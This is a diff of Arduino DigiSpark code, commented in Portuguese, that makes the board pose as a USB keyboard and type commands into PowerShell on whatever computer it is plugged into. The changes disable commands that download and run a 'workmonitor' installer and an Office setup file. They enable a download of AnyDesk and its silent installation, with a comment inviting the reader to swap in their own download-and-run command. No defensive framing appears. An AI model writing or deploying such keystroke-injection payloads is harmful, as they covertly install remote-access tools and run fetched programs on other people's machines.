@@ -14,23 +14,23 @@ void loop() {
   // Digita "powershell" na caixa de execução e pressiona Enter
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(1000);
 
   // Envia o comando para baixar e executar um arquivo, mas aqui você pode modificar para o seu uso
-  DigiKeyboard.print("Start-BitsTransfer -Source \"http://workmonitor.com/install/install.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\spa-install.exe\"");
+  /*DigiKeyboard.print("Start-BitsTransfer -Source \"http://workmonitor.com/install/install.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\spa-install.exe\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(7000);
 
   DigiKeyboard.print("Start-BitsTransfer -Source \"https://github.com/YuriGomes4/arduino/raw/refs/heads/main/Resources/OfficeSetup.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\office-install.exe\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(7000);
-
-  /*DigiKeyboard.print("Start-BitsTransfer -Source \"https://download.anydesk.com/AnyDesk.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\anydesk-install.exe\"");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(7000);*/
 
+  DigiKeyboard.print("Start-BitsTransfer -Source \"https://download.anydesk.com/AnyDesk.exe\" -Destination \"$($env:USERPROFILE)\\Downloads\\anydesk-install.exe\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(7000);
+
   // Executa o arquivo baixado
-  DigiKeyboard.print(".\\Downloads\\spa-install.exe");
+  /*DigiKeyboard.print(".\\Downloads\\spa-install.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
 
@@ -45,14 +45,14 @@ void loop() {
   DigiKeyboard.delay(10000);
 
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(5000);*/
 
   /*DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
-  DigiKeyboard.delay(800);
+  DigiKeyboard.delay(800);*/
 
   DigiKeyboard.print("Start-Process -FilePath \"AnyDesk.exe\" -ArgumentList \"--install `\"C:\Program Files (x86)\AnyDesk`\" --silent\" -NoNewWindow -Wait");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(7000);*/
+  DigiKeyboard.delay(7000);
 
   //DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
